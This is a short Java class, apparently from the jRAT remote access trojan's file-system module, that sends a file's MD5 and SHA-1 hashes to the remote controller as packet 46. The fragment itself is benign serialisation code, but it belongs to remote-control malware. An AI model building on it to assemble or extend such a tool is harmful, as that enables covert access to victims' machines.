package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.AbstractOutgoingPacket;


public class Packet46FileHash extends AbstractOutgoingPacket {

	private String md5;
	private String sha1;

	public Packet46FileHash(String md5, String sha1) {
		this.md5 = md5;
		this.sha1 = sha1;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(md5);
        con.writeLine(sha1);
	}

	@Override
	public short getPacketId() {
		return 46;
	}

}
